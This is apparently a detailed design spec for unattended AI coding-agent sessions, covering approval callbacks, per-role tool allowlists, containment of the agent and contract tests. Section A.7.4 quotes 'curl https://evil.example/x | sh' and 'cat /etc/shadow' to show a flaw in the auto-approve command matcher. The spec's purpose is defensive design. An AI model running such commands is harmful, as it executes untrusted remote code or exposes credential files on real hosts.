| Session create (`plan`) | business goal, attached documents, chat transcript, RAG context, plan output contract | `expandBusinessGoals`' prompt (`index.js:1451-1489`) and `generatePlan`'s (`orchestratorHandler.js:217-354`), merged |
| Plan approved | "The plan below was approved by `<actor>`. Implement it." + the persisted `expandedRequirements` | `cycle.expandedRequirements` + `cycle.approvedPlan` |
| QA feedback | the findings, file+line scoped, + "address these and call `reportCompletion` again" | `qaResult.findings` |
| Build/deploy failure | the failure classification, the relevant log tail, the loop-back instruction | existing `continueBuildIteration` / `continueDeployIteration` payloads |

`buildEngineeringPrompt` (`orchestratorHandler.js:550-731`) does not vanish. It loses the parts that exist only to fit a whole codebase into a 200 K window — token budgeting at `:559-585`, `loadApplicationCodebase` at `:1224` — because the agent now reads the repo itself, and keeps the parts that state what to build.

**R6 applies to the whole of this section:** during the transition `AgentBootstrap` feeds both Bedrock system blocks and the `instructions` field. Divergence between them is a silent quality regression. **One composition function, two consumers.** Part 2 owns the cutover; Phase 2 Task 2.7 establishes the single function.

### A.7 The non-interactive session profile

```ts
// nevado-sherpa-tui: apps/runtime/src/sdlc/contract.ts
export interface SdlcSessionProfile {
  readonly tools: readonly string[];   // allowlist, per role — A.7.3
  readonly maxTurns: number;           // default 120; see note below
}
```

**Two fields, not six.** An earlier draft also carried `attended: false`, `approvalPolicy: 'auto'`, `autoApproveAllCommands: true` and `workspaceIsolation: 'per-session'`. Those are cut deliberately:

- The first three are **three encodings of one decision**, and the decision is already carried by a field that is *persisted and survives a resume*: `application === 'sdlc'` (§A.8 P1). The callbacks are rebuilt on every resume (§A.7.1), so a discriminator that lives only in a create-time payload is the wrong place for it. Three redundant encodings also means three places to disagree.
- `workspaceIsolation: 'per-session'` **asserts something the runtime does unconditionally** — one independent clone per session, `agent/workspace.ts:33-47`. A field that cannot be false is decoration, and worse, an implementer may read it as a control that could be turned off. It cannot.

The unattended posture is documented where documentation belongs — the runbook (Phase 0 Task 0.9) and the code comment at the callback — not encoded three times in a request body. **`application: 'sdlc'` is the discriminator; the profile carries only what the runtime cannot derive.**

`ToolContext` is assembled once per session (`engine/tools/tool-context.ts:38-59` at `sherpa-sdk` HEAD) and `ToolDispatcher.execute` is re-entered by sub-agents and personas (`engine/tools/tool-dispatcher.ts:59-102`; re-entry injected at `:67` for `dispatchSubAgents` and `:69` for `usePersona`), so **whatever is decided here applies identically at every nesting depth**. That is a real property of the existing design and it is why this can be configured once rather than audited per tool. The deployed 4.0.1 has the same property with the same dispatch shape inline in `agent-engine.ts:801-842` (§0.1.b C29).

**`maxTurns` is not plumbed today.** `maxAgentTurns` exists in `SherpaSettings` (`protocol/src/settings.ts:30`, default 200) and is **read by nothing in `apps/runtime`**. `EngineConfig.maxTurns` is the engine's actual cap, and the runtime's `getConfig` (`agent/worker.ts:98-102`) returns only `contextWindow`, `firecrawlApiKey` and `awsProfile` — so `maxTurns` is always `undefined` and the engine falls back to `DEFAULT_MAX_TURNS = 200` (§0.1.b C27). Honouring `profile.maxTurns` means `getConfig` must start returning it, derived from the session. One line plus a persisted session field. Phase 2 Task 2.4.

**Why 120 and not 200:** an SDLC step that needs more than 120 turns has almost certainly lost the plot, and hitting the cap produces a `paused` with `reason: 'max_turns'` (§A.4.2) which CC can act on — whereas letting it run to 200 just costs more before delivering the same signal. The number is a judgement call, not a measurement; revisit it once Part 2 Phase 4 has ten real cycles to look at.

#### A.7.1 `approval`

Every mutating tool calls `ctx.approval(...)` first: `editFile` (`platform-tools.ts:87`), `writeFile` (`:130`), `runCommand` (`:176`, reached only when `isAutoApprovedCommand` at `:174` does not already short-circuit). `ApprovalCallback` returns `Promise<boolean>`; rejection becomes `toolRejected()` and **the turn loop stops issuing further tools** (`tool-dispatcher.ts:130-137` returns `null`, which is the stop signal).

For an SDLC session — discriminated on `application === 'sdlc'`, not on a profile field — the runtime supplies an approval callback that resolves `true` **without emitting `approvalRequired`**.

**The seam is known and it is small.** Both callbacks are built **per `startSession` call** in `nevado-sherpa-tui/apps/runtime/src/agent/worker.ts` — `approval` at `:138-182`, `question` at `:185-198` — and both already close over `session`. So the per-session branch is roughly four lines: in `approval`, return `true` early when the session is an SDLC session; in `question`, return a fixed non-interactive string. **No SDK change is needed for either.** They are passed to the runner at `worker.ts:215-221`.

Today both callbacks park on an unresolved promise with a `setTimeout` of `config.approvalTimeoutMs` (default **1 800 000 ms = 30 minutes**): `waitForApproval` (`worker.ts:309-318`) resolves `false` on timeout, `waitForQuestion` (`:320-329`) resolves `'(timed out — no answer provided)'`. **Thirty minutes is longer than the 20-minute stall threshold** (`cycleStatuses.js:144`), so an SDLC session that reached either wait would be declared stalled before it timed out. That is the failure §A.7.2 exists to prevent, and it is why the early return matters more than the timeout value.

**Why this cannot be a settings change.** `autoApproveFileChanges` and `autoApproveAllCommands` are **process-global**, read from `this.settingsStore.get()` at `worker.ts:148` and `:159`. The store is a single in-memory `SherpaSettings` loaded from `~/.config/nevado/settings.json`, and it is **mutated process-wide by `PUT /v1/workspace/settings`** (`routes/settings.ts:24-28`). So:

> **Flipping the global settings to make SDLC sessions unattended would also make every human session on that host unattended** — and any caller past the ALB can do it (§0.1.b C28). The profile must be per-session.

The discriminator has to live on the **persisted** `AgentSession`, because the callbacks are rebuilt on every resume. `application: 'sdlc'` (§A.8 P1) is the natural one and requires no new field. There is no extension bag on `AgentSession`.

`isAutoApprovedCommand` (`agent-engine.ts:202-210` in 4.0.1) **unions** the caller's patterns with the 47-entry built-in `DEFAULT_AUTO_APPROVED_COMMANDS` (`:140-156`). **`autoApprovedCommands` can only ever add**; there is no way to narrow the built-in list from settings. That is worth knowing before anyone proposes option (c) in §A.7.4 — a "tightened SDLC-specific allowlist" is not expressible without an SDK change.

#### A.7.2 `question`

`askQuestion` returns `toolError('Question capability not available in this context.')` when `ctx.question` is unset (`workspace-tools.ts:17-18`). Its metadata is `{readonly: false, timeoutMs: 0, timeoutExempt: true}` (`tool-metadata.ts:24`), so when `ctx.question` **is** set and nothing answers, the tool **blocks forever**.

**SDLC sessions do not support questions.** There is no UI, no cycle status, and no path to route an answer back into a running session. Two layers, both degrading rather than blocking:

1. `askQuestion` is absent from every role's allowlist (§A.7.3), so it never reaches `buildToolConfig`'s output and the model never sees it. **This is the primary control.**
2. `ctx.question` left **unset**, so any other path that reaches it (a persona, a future tool) gets the existing `toolError` and the agent continues on its own judgement rather than hanging.

Ambiguity is resolved at the plan-approval gate, before engineering starts. An agent that needs to ask mid-implementation is a signal the plan was underspecified.

Without this, an SDLC session that asks a question hangs silently until stall detection fires at ~20 minutes (`cycleStatuses.js:144`).

#### A.7.3 `buildToolConfig` and the allowlist

**Allowlist, not denylist.** A denylist fails open: every tool added to `sherpa-sdk` would land in SDLC sessions automatically until someone remembered to exclude it, on sessions that run unattended with blanket auto-approve. An allowlist fails closed, and the failure is visible — the agent reports that it cannot do something rather than silently gaining a capability nobody reviewed.

The full surface is **19 tools**, verified in `sherpa-sdk/packages/core/src/tool-specs.ts`. `baseToolSpecs` (declared `:3`) = 10: `readFile` (`:5`), `editFile` (`:23`), `writeFile` (`:60`), `listFiles` (`:82`), `searchCode` (`:99`), `runCommand` (`:125`), `writePlan` (`:146`), `askQuestion` (`:173`), `dispatchSubAgents` (`:197`), `webSearch` (`:232`). `extendedToolSpecs` (declared `:259`) = 9: `updateTaskTracker` (`:261`), `switchMode` (`:303`), `semanticSearch` (`:328`), `searchSessions` (`:356`), `listMcpTools` (`:381`), `useMcpTool` (`:393`), `saveLearnedPattern` (`:423`), `updateTechDebt` (`:455`), `usePersona` (`:497`). `toolSpecs` = both (`:524`).

Per role — these three lists are normative and Part 2 codes against them:

| Role | Tools |
|---|---|
| `plan` | `readFile`, `listFiles`, `searchCode`, `runCommand`, `writePlan`, `submitPlan`, `updateTaskTracker`, `dispatchSubAgents` |
| `engineer` | `readFile`, `editFile`, `writeFile`, `listFiles`, `searchCode`, `runCommand`, `updateTaskTracker`, `dispatchSubAgents`, `usePersona`, `reportCompletion` |
| `qa` | `readFile`, `listFiles`, `searchCode`, `runCommand`, `updateTaskTracker`, `dispatchSubAgents`, `submitReview` |

**Each role gets EXACTLY ONE terminal tool.** `plan` → `submitPlan`, `engineer` → `reportCompletion`, `qa` → `submitReview`. Mode gating cannot express this and cannot even see these tools (§A.5.4), so **this is the only place the per-role separation happens** — **assert the full sorted set in a test, not `toContain`**, because the whole point of an allowlist is that nothing arrives by default.

**Revision 6: the guarantee is enforced twice, and the create route refuses a request that gets it wrong.** `profile.tools` is where Command Center states the role, and the runtime **validates at create time that the list names exactly one of the three terminal tools**, with a `400` otherwise:

- **Zero** means the session has **no way to submit a result** and would burn its whole turn budget before anyone found out.
- **Two** means the published result's `kind` is **ambiguous** and the runtime has no basis for choosing between them.

The `400` names the count and the offending tools, because it is a Command Center dispatcher bug and create time is the only moment it is actionable. **Then the session's provider advertises that one tool and refuses every other name** — so the configuration states the role, and the code enforces it. **The rest of `profile.tools` is advisory on the deployed 4.0.1**: `buildToolConfig` is subtractive with no allowlist parameter (§A.5.4), so the nineteen non-terminal tools below **cannot actually be withheld** by this list. Treat the three lists as normative for what a role is *meant* to have and as the thing to implement against the day the SDK grows an allowlist — but **do not describe the non-terminal half as a control that is in force.** The terminal half is.

**Note the `qa` list differs from the architecture doc**, which lists `reportCompletion` for `qa` in its §4.3 table while its own §2.6 says QA cannot use it. §2.6 is right and the table is a leftover; QA changes no files, so `reportCompletion`'s empty-tree rule would reject every honest QA completion.

Why each exclusion, since these are the ones that would otherwise arrive by default:

- **`askQuestion`** — nothing can answer it (§A.7.2).
- **`switchMode`** — CC owns the plan→do transition by starting a new session. An agent switching its own mode mid-step invalidates what the cycle record says it is doing. Excluding it is also what makes `modeSwitch` unpublishable (§A.4.2).
- **`searchSessions`** — *"Search across other Sherpa agent sessions… searches session conversation history for matching content"* (`tool-specs.ts:356-362`). Cross-session transcript read, across tenants — the same isolation problem §A.3's read ACL addresses at the API, arriving instead through the tool surface where the API ACL cannot see it.
- **`saveLearnedPattern`, `updateTechDebt`** — *"These are loaded into your context in future sessions"* (`:423-428`). Unattended writes to persistent shared state that later sessions, including human ones, inherit, with no review step. A deliberate grant, not a default.
- **`webSearch`** — no Firecrawl key on the runtime, so it fails at call time anyway (`workspace-tools.ts:35`).
- **`listMcpTools`, `useMcpTool`** — ~~not granted~~ **REQUIRED (revision 6), and this row inverts.** They are provider-gated, appearing only when a provider is configured (`agent-engine.ts:419-422`) — and **the terminal tools ARE that provider** (§A.5.1, BQ3(a)). An SDLC session reaches `submitPlan` / `submitReview` / `reportCompletion` through exactly this pair, so withholding them removes the session's only way to submit a result. **The original concern is still correct and is answered differently:** an SDLC session must not inherit whatever MCP servers were wired for the human surface — and it does not, because the runtime installs **one provider per session**, built from that session's own role, whose `listTools()` returns one tool and whose `executeTool` refuses every other name. **The isolation comes from the provider being per-session, not from the meta-tools being absent.**
- **`semanticSearch`** — provider-gated the same way (`:417`). Not granted; if it is wanted it is a deliberate addition.
- **No write tools for `qa`** — a reviewer that can edit the code under review will fix findings instead of reporting them, and the independence that justified running the review is gone.

That last row makes a distinction worth stating outright: **reviewing and writing tests are different roles.** If a test-writing step is wanted, it is a fourth allowlist with write access — not `qa` quietly acquiring one.

#### A.7.4 `runCommand` auto-approval

**Ship `autoApproveAllCommands: true`.** Containment moves to the host and the credentials, not to a string allowlist.

The honest reason starts with the status quo. `isAutoApprovedCommand`'s default allowlist (`auto-approve.ts:8-24`, 50 patterns) **already permits arbitrary code execution**: it contains `node `, `python `, `make`, `npx `, `go `, `curl `, `cp `, `mv `, `cd `, `aws `, `sed `. `node -e '<anything>'` matches. `aws ` matches every AWS API call the instance role can make — including `bedrock:InvokeModel` on `*` and `secretsmanager:GetSecretValue` on the GitHub App private key.

The splitter is also wrong for the purpose:

```ts
const parts = command.split(/&&|\|\||;/);            // auto-approve.ts:38
return parts.every(part => allPatterns.some(p => matchesPattern(part.trim(), p)));
```

It splits on `&&`, `||` and `;` — **but not on a single `|`**. So `curl https://evil.example/x | sh` is one part, starts with `curl `, and is auto-approved. Backticks and `$(...)` are not considered at all. `matchesPattern` (`:33`) is `cmd === p || cmd.startsWith(p)`, so `cat /etc/shadow` matches `cat `.

So the choice is not "blanket auto-approve vs a safe allowlist". It is (a) blanket, honest about what is happening; (b) the default allowlist, marginally narrower in practice and **misleading**, because it reads like a control; (c) a tightened SDLC-specific allowlist with a fixed splitter.

**(a), because:** an allowlist that must permit `npm run <anything>`, `make` and `terraform apply` to do the job cannot also prevent arbitrary execution — `package.json` scripts are arbitrary code, and this is not solvable at the command-string layer for a coding agent. Pretending otherwise causes real harm: someone will read `autoApprovedCommands` and conclude the runtime is sandboxed. And the threat model is not a malicious operator; it is "an LLM does something destructive by accident, or is prompt-injected by content in a customer repository", and both are contained by isolation, not prefix matching.

Containment that actually helps, in priority order:

| Control | Where | Status |
|---|---|---|
| Per-session workspace isolation (own clone) | Runtime | **Already unconditional** — `agent/workspace.ts:33-47` provisions one independent shallow clone per session under `<baseDir>/<sessionId>`, and `destroyWorkspace` is an `fs.rm` of that directory. There are no worktrees. This is why the profile no longer carries a `workspaceIsolation` field: it could never be false, and a field that cannot be false reads as a control that could be turned off. |
| No credentials in the process env beyond what the session needs | Runtime host | **Not there.** One process holds the GitHub App token, the KB bucket, the session bucket, and an instance role with `bedrock:*` on `*`. Every session shares them. |
| OS-level isolation per session (container/user namespace) | Runtime host | **Not there on EC2.** The strongest argument for the in-flight Fargate migration — per-task isolation is a boundary a `startsWith` check can never be. |
| Egress restriction | Runtime SG | TCP 443 to `0.0.0.0/0`. Narrowing breaks `npm install`; not worth it. |
| IMDSv2 hop limit | Runtime instance | Already 2. |
| Fix the `\|` splitter and reject `$()`/backticks | `auto-approve.ts:38` | **Phase 0 Task 0.8.** A real bug in a function whose own docblock calls itself a security boundary, affecting human sessions today. |

**Write the blanket-auto-approve fact into the code comment and the runbook.** R2 is a documentation risk, and documentation is its only mitigation.

### A.8 ~~Protocol changes required~~ in `@nevadoai/sherpa-protocol` and `-core` — **none are required**

**⚠ Revision 6 demotes this entire section from a work list to a record.** It was written as "twelve changes, one 4.0.2 release, and three repos bump in order". **Nothing in it shipped, nothing is on the critical path, and there is no 4.0.2.** Both consumers pin **`4.0.1`**: `nevado-sherpa-tui`'s `pnpm-lock.yaml` resolves `@nevadoai/sherpa-core` and `-protocol` to `4.0.1`, and Command Center still carries `PINNED_SDK_VERSION = '4.0.1'` against `^4.0.1` in `frontend/package.json`.

**How each row was actually satisfied instead:**

| Disposition | Rows | Mechanism |
|---|---|---|
| **Declared locally in the runtime** | P6, P7, P8 | `apps/runtime/src/sdlc/contract.ts` declares `SdlcCreateSessionRequest` (every field `unknown` — it is a wire body from another service), `SdlcCreateSessionResponse`, `SdlcCorrelation`, `SdlcSessionProfile` and `SdlcErrorResponse`. **These declarations are the authority, not a mirror of something in the protocol package** |
| **Accommodated by a cast** | P1 | `SessionApplication` lacks `'sdlc'` at 4.0.1, so the create route **casts at its single `manager.create` call site**. The value is settable at runtime regardless. `sherpa-sdk` #227/#228 later widened the union — **nothing consumes it** |
| **Not needed: the value is never persisted** | P2 | `'queued'` is a **create-response field only**, describing admission rather than session state. The persisted `SessionStatus` union is untouched |
| **Bypassed the ServerMessage union entirely** | P4, P5, P9 | 4.0.1's `sessionStatus` variant carries no reason field and there is no `completion` variant — so `SdlcPublisher` publishes **`sessionEnd`** and **`completion`** events of its own onto the SQS envelope, **bypassing the broadcaster** rather than widening the protocol. The `PauseReason` vocabulary is **restated** in `publisher.ts` as `SESSION_END_REASONS`, readable without opening the SDK, and pinned by the driftguard **both ways** — as data, and against the reasons the deployed engine can actually produce |
| **DELETED — declined on merit** | **P10** | `sherpa-sdk` #226, closed unmerged. `createdBy` backs `renameSession`'s ownership check. See Task 2.0 and BQ3a |
| **DELETED — moved into the runtime** | **P11, P11b, P11c** | The three tools, the validator and the double-submit guard are `apps/runtime/src/sdlc/`, behind `McpToolProvider`. No `tool-specs.ts`, no `TOOL_METADATA`, no dispatch arm, no `PLAN_BLOCKED_TOOLS` entry (§A.5.4) |
| **DELETED — not applicable** | **P11a** | A spec↔handler conformance test has nothing to bind: the model never sees an `inputSchema` through `useMcpTool`, so there is no declared schema for a handler to disagree with. **The drift evidence in §A.5.0a stands as the argument for §A.5.0 and is an SDK bug, not a prerequisite** |
| **DELETED — not expressible** | **P12** | 4.0.1's `buildToolConfig` is subtractive over fixed conditions with **no allowlist parameter**. The per-role separation is the provider's `executeTool` name check instead (§A.5.4, §A.7.3) |
| **DELETED — describes a convention the code does not follow** | **P3** | `createdBy` is never written with a machine value, so a doc comment about an `m2m:` namespace would document a fiction. §A.3 |

**The rows below are retained verbatim as the record of what was specified**, so a future reader can see what was proposed and what replaced it. **Do not implement them.** If a genuine protocol change is ever needed, the constraints at the foot of the table still govern: all additive, **none breaking**, because the runtime and CC cannot be released atomically (§0.3).

| # | Change | File (4.0.1 paths) | Kind |
|---|---|---|---|
| P1 | `SessionApplication` gains `'sdlc'` | `packages/protocol/src/session.ts:3` | union widening |
| P2 | `SessionStatus` gains `'queued'` | `session.ts:1` | union widening — **audit every exhaustive `switch`/map over `SessionStatus` in all three repos before merging.** A widened union with a non-exhaustive consumer is a silent fallthrough, which is exactly the `mapStatusToStageIndex` failure class (`CycleProgress.jsx:29-31`). `runtimeEvents.mapSessionEvent`'s `default` arm already tolerates unknown types so CC is safe; the human surfaces may not be |
| P3 | `createdBy` doc comment notes the `m2m:<client_id>` namespace | `session.ts:117` | comment only |
| P4 | `sessionStatus` ServerMessage gains `reason?: PauseReason` | `messages.ts` (the `sessionStatus` variant) | optional field |
| P5 | `PauseReason` reachable from `protocol` | currently `packages/core/src/engine/engine-types.ts:54-63` (HEAD) / inline in 4.0.1 | **`protocol` must not depend on `core`** — copy the union into `protocol` and have `core` import it, or duplicate with a drift guard. Decide in Phase 3 Task 3.9; do not create a circular dependency |
| P6 | `CreateSessionRequest` gains `commitSha?`, `baseBranch?`, `instructions?`, `model?`, `profile?`, `correlation?`, **`resultSchema?`** | `api.ts:3-13` | optional fields. `resultSchema` is typed `unknown` — §A.5.3. It is the seventh field of the same class as the other six and costs nothing extra in this release |
| P7 | `CreateSessionResponse` gains `status?`, `workspacePath?`, `branch?` | `api.ts:15-18` | **all three optional in the type**, or the human path stops type-checking. `status` is required *on the SDLC path* by contract, not by the type |
| P8 | New `packages/protocol/src/sdlc.ts` exporting `SdlcCorrelation`, `SdlcEventEnvelope`, `SdlcEvent`, `CompletionPayload`, `EngineeringCompletion`, **`PlanResult`**, **`ReviewResult`**, `SdlcSessionProfile` | new file | additive; re-export from `index.ts`. **`PlanResult` and `ReviewResult` carry `payload: unknown`** — no CC business field appears in this file, which is the property §A.5.0 protects |
| P9 | New `completion` ServerMessage variant carrying `CompletionPayload` | `messages.ts` | union widening. Same exhaustiveness audit as P2 |
| **P10** | **`createdBy` and `application` move out of `SessionManager.create`'s forced block** so an explicitly supplied `options` value wins, defaults unchanged; `id`, `name`, `status`, `publishState`, `transcript`, `tombstone` stay forced | `packages/core/src/session-manager.ts:755-768` | two lines. **Not a prerequisite for v1's ACL** (§0.1.d(2) — `application` is already settable because the runtime's manager has no `application`), but it removes a silent-override hazard and populates `createdBy` for v2's per-client predicate. Rides this release at zero marginal cost |
| **P11** | `reportCompletion`, `submitPlan` and `submitReview` tool specs; `reportCompletion` added to `PLAN_BLOCKED_TOOLS`; all three added to `TOOL_METADATA`; dispatch arms and handler bodies | `packages/core/src/tool-specs.ts` (**byte-identical between 4.0.1 and HEAD**, blob `495a7935…`, so the 64-commit gap is irrelevant to this question), `tool-metadata.ts`, and `agent-engine.ts:801-842` in 4.0.1 | Task 2.1. **A tool absent from `TOOL_METADATA` silently gets `DEFAULT_METADATA`**, which feeds the turn loop's parallelism decision — an omission no existing test catches |
| **P11a** | **A spec↔handler conformance test** in `packages/core`: for every tool, every property the handler reads must be declared, and every `required` property must be one the handler tolerates | `tool-specs.test.ts` or a new file | **This is not optional hygiene.** `saveLearnedPattern` and `updateTechDebt` have both drifted in shipped code and `tool-specs.test.ts` tests only name filtering (§A.5.0a). Without this test the three new tools join that arrangement. It will fail on the two existing tools — **fix them or allowlist them explicitly with a reason**, the way `frontendContractGuard.test.js` handles `KNOWN_GAPS` |
| **P11b** | The generic `resultSchema` validator — bounded keyword subset, hand-rolled, no new dependency | new file in `packages/core/src` | §A.5.3, ~120 lines + tests. **Do not add `ajv`** — and note neither repo has *any* validation dependency today |
| **P11c** | The "result already submitted" guard, in-memory per session | the terminal-tool handlers | §A.5.4a. Makes first-write-wins deliberate rather than accidental |
| **P12** | `buildToolConfig` honours an allowlist (a purely subtractive `filter`) | `agent-engine.ts:414-434` (HEAD) / inline in 4.0.1 | §A.7.3. Do it in the same release as P11 or it costs a second one |

**What is NOT here, and deliberately:** any plan or review *field*. `PlanResult` and `ReviewResult` carry `payload: unknown`; `requirements`, `acceptanceCriteria`, `complexity`, `category`, `verdict`, `severity`, `findings` and the rest never enter the protocol package or `tool-specs.ts`. That is the whole point — **§A.8 is a list that should never need a row added for a plan or QA schema change again**, and §A.5.3's `resultSchema` is what preserves in-session enforcement without giving that property up.

~~**Ordering.** P1–P12 land in one 4.0.2 release, then the runtime bumps, then `command-center/frontend` bumps and `PINNED_SDK_VERSION` is updated in the same PR.~~ **STRUCK (revision 6). There is no such ordering, because there is no release to order.**

**The chain `sherpa-sdk → runtime → command-center` is FALSE, and asserting it is the single most expensive error this section could propagate**, because it turns a one-repo runtime deploy into a three-repo release train with an outage window in the middle. What is actually true:

- The runtime is built against **`4.0.1`, which is already deployed.** `pnpm-lock.yaml` is unchanged by any of this work.
- Command Center's `PINNED_SDK_VERSION` stays at **`4.0.1`** and its drift guard **passes as-is**. Nothing updates it.
- The one SDK release that did happen (#227/#228) is **consumed by neither.**

**What replaces the drift guard's job on the SDLC path** is `apps/runtime/src/sdlc/contract.driftguard.test.ts`, and it is a different kind of test worth understanding before changing anything in `src/sdlc/`. It pins the numbers and literals that are a **contract with Command Center rather than with another module** — the nine-keyword `resultSchema` allowlist, its three bounds, the two `correlation` bounds, `SDLC_APPLICATION`, `SDLC_DEFAULT_MAX_TURNS` and the `sessionEnd` reason vocabulary. Three of those **cost an outage window to change**, which is why they are pinned rather than trusted to review: the runtime has no deploy pipeline, so widening the allowlist or moving a bound is not a code change, it is a scheduled outage.

**Two of its pins are the opposite shape and are the interesting ones: they assert that something is IMPOSSIBLE against the deployed SDK.**

- **The `completed` pin** — no `finish(session, 'completed', …)` site exists, which is what makes Command Center's deleted `completed` path unreachable. That fact is load-bearing **in two repos**, and until it was pinned the only thing holding it up was a comment. **Without an assertion, the first signal of an SDK that starts completing sessions is a production SQS message in a DLQ, nine minutes later, in the repo that did NOT bump the version.**
- **The `onError` pin** — `EngineEvents` declares no `onError`, so the publisher's `error` arm is dead. The arm is **kept** and the pin is what says so out loud, failing when a future SDK makes it reachable.

**Both carry a positive control**, and that is not decoration: the same probe run over a hypothetical future sink must answer "yes", so **a probe that has quietly stopped detecting anything cannot pass.** Preserve the controls in any edit.

The 64-commit HEAD bump is still a separate release on the runtime owner's schedule, and is now fully decoupled from this work (BQ3(b)).

**The Command Center backend cannot import any of this** (§0.0). It restates the contract in `backend/common/sdlcContract.js` with a drift guard. Phase 3 Task 3.1 builds it.

### A.8a The payload schemas as shared data — `PLAN_PAYLOAD_CONTRACT` and `QA_PAYLOAD_CONTRACT`

**One object per stage, in `backend/common/sdlcContract.js`, read by three consumers.** This is what makes §A.5.3 worth having and it is the piece an earlier revision left asymmetric.

```js
// backend/common/sdlcContract.js
const PLAN_PAYLOAD_CONTRACT = { schema: { /* JSON Schema */ }, requiredKeys: [...], prose: '…' };
const QA_PAYLOAD_CONTRACT   = { schema: { /* JSON Schema */ }, requiredKeys: [...], prose: '…' };
```

| Consumer | Reads |
|---|---|
| `buildInstructions` (§A.6, Task 2.7) | `.prose` / `.requiredKeys` — what the agent is **told** to produce |
| `createSession`'s `resultSchema` (§A.5.3) | `.schema` — what the runtime **enforces in-session** |
| `validateCompletionPayload` (Task 3.1) | `.schema` — what the consumer **accepts**, plus cross-field rules a schema cannot state |

**Why one object and not three.** An earlier revision had the QA half share a contract between prose and validator while the plan half shared nothing — the plan prose came from §A.6's composition independently. **So the plan schema — the one a human approves at a gate — was the half where prompt and validator could silently diverge**, which is precisely the failure the runtime itself already exhibits in `saveLearnedPattern` (§A.5.0a). Symmetry here is not tidiness; it is the same defect class.

**Part 2 owns the contents** (Phase 5 for the plan, Phase 6 for the review). Part 1 owns the module, the three-consumer contract, and the test that binds them.

#### The plan payload's required set — re-derived from the live consumer

**Derive it from all three live consumers: `PlanReview.jsx`, `ApplicationDetail.jsx`'s dialog, and `recordCheckpoint`.** Revision 3 excluded the second on the grounds that it was unreachable; it is not (§0.7, Task 0.6). Where the two dialogs read different subsets — and they do — the required set is the **union**, because either surface rendering a blank panel is a user-visible defect at an approval gate.

| Field | Required? | Evidence |
|---|---|---|
| `summary` | **required** | `PlanReview.jsx:118` |
| `requirements` | **required, and must be an array** | `PlanReview.jsx:19-20` reads `plan.requirements \|\| plan.tasks` and immediately `.reduce`s it — a truthy non-array **throws and breaks the approval gate.** `maxItems` also belongs here, per §A.4.3's oversize gate |
| `requirements[].{id, title, description, complexity}` | **required** | `PlanReview.jsx:125-178` |
| `requirements[].acceptanceCriteria` | required | `PlanReview.jsx:125-178` |
| `requirements[].dependencies` | **optional** | read at `:125-178` but genuinely optional; **neither earlier revision listed it at all** |
| `filesToCreate`, `filesToModify` | **required** | `recordCheckpoint`'s evidence counts (`index.js:1305-1313`). These were null whenever the fallback planner ran, which is the divergence collapsing to one planner fixes |
| `assumptions`, `risks` | required | `PlanReview.jsx:187-208` |
| `estimatedEffort` | optional | `recordCheckpoint` reads it (`:1314`) but tolerates absence |
| **`approach`** | **required** | Revision 3 briefly demoted this to optional, on the reasoning that no dialog rendered it. **That reasoning was wrong and the conclusion is reversed** — see §0.7. It has **two** classes of live reader: (a) `ApplicationDetail.jsx`'s plan dialog, which is reachable via the attention card (Task 0.6) and renders it once the `technicalApproach` typo is fixed; and (b) `cursorAgent/devHandler.js:98`, where `requirements: plan?.approach \|\| task` makes it **the Cursor dev agent's entire requirements input** under `devAgent: 'cursor'`, plus `devHandler.js:150` and `integrationAgent/orchestratorHandler.js:112`. (b) alone justifies required status: a plan with no `approach` silently degrades that agent's input to a one-line task. **Note `PlanReview.jsx` genuinely does not read it** — so the two live dialogs render different subsets, which is a real duplication worth resolving separately |
| **`technicalApproach`** | **must be actively REJECTED** | Nothing writes it and nothing live reads it. A schema that merely does not require it would let a model emit it and have it silently persist. `additionalProperties: false` handles this generically — which is why it is in §A.5.3's supported keyword subset |
| `tasks` | **accepted as an alias for `requirements`** | `PlanReview.jsx:19` reads `plan.requirements \|\| plan.tasks`. Either the schema permits both, or CC normalises one to the other before persisting. **Decide in Part 2 Phase 5 and write it down** — an undocumented alias is how the next reader concludes the field is optional |
| `planVersion` | **not a payload field** | Lives on the **cycle**, not the plan (`PlanReview.jsx:17`), written only by `planComments.js:325` on the revision path. It must not appear in the payload schema |

### A.9 Contract test suite

One suite that both halves of the boundary are checked against. `backend/__tests__/sdlcContract.test.js`, built in Phase 3 Task 3.1 and extended by Part 2.

Shared fixtures live in **`backend/__tests__/fixtures/sdlcEvents.js`** (a new directory; there is no fixtures convention yet, so establish one). Fixtures are plain objects, exported by name, and **used by both the mapper tests and the consumer tests** so a shape change fails in one place.

Minimum fixture set:

Every envelope fixture carries `v: 1`, a `sessionId`, a `dedupId` (a fixed UUID string — fixtures must not call `randomUUID()`, or two tests cannot assert on the same value), a `publishedAt`, and a `correlation`.

| Export | Shape |
|---|---|
| `ENVELOPE_TIER2` | two `toolStart` + one `toolEnd`, `correlation.stage: 'engineering'` |
| `ENVELOPE_COMPLETION_ENGINEERING` | one `completion` with a valid `EngineeringCompletion` (`kind: 'engineering'`, `outcome: 'success'`) |
| `ENVELOPE_COMPLETION_BLOCKED` | `kind: 'engineering'`, `outcome: 'blocked'` with `blockedReason` |
| `ENVELOPE_COMPLETION_PLAN` | `correlation.stage: 'planning'`, **`kind: 'plan'`**, a **valid** plan `payload` |
| `ENVELOPE_COMPLETION_PLAN_MALFORMED` | same, with a `payload` that fails `validateCompletionPayload('planning', …)`. **New in this revision** — the plan payload is no longer schema-enforced by the tool-use API (§0.1.d(1)), so this is the fixture that exercises the CC-side validator that replaced it |
| `ENVELOPE_COMPLETION_REVIEW` | `correlation.stage: 'qa'`, **`kind: 'review'`**, a valid review `payload` with two findings |
| `ENVELOPE_COMPLETION_REVIEW_AS_PLAN` | `correlation.stage: 'planning'` with `kind: 'review'` — **the stage-mislabel case the three-kind design exists to catch.** Under a single collapsed tool this fixture would be inexpressible |
| `ENVELOPE_COMPLETION_PLAN_OVERSIZE` | a plan `payload` that passes the schema but exceeds the cycle item's remaining DynamoDB budget (§A.4.3) — terminal status, not DLQ |
| `ENVELOPE_COMPLETION_REVIEW_MALFORMED` | same, with an invalid `payload` |
| `ENVELOPE_ERROR` | one `error` event per stage (three fixtures, or one factory taking a stage) |
| `ENVELOPE_PAUSED_MAX_TURNS` | `sessionStatus: 'paused'`, `reason: 'max_turns'` |
| `ENVELOPE_PAUSED_NO_REASON` | `sessionStatus: 'paused'` with no `reason` — must map to no effect (§A.4.2) |
| `ENVELOPE_STAGE_MISMATCH` | `correlation.stage: 'qa'` with `kind: 'engineering'` |
| `ENVELOPE_UNKNOWN_KIND` | `kind: 'somethingNew'` — a future tool's payload, which must fail loudly |
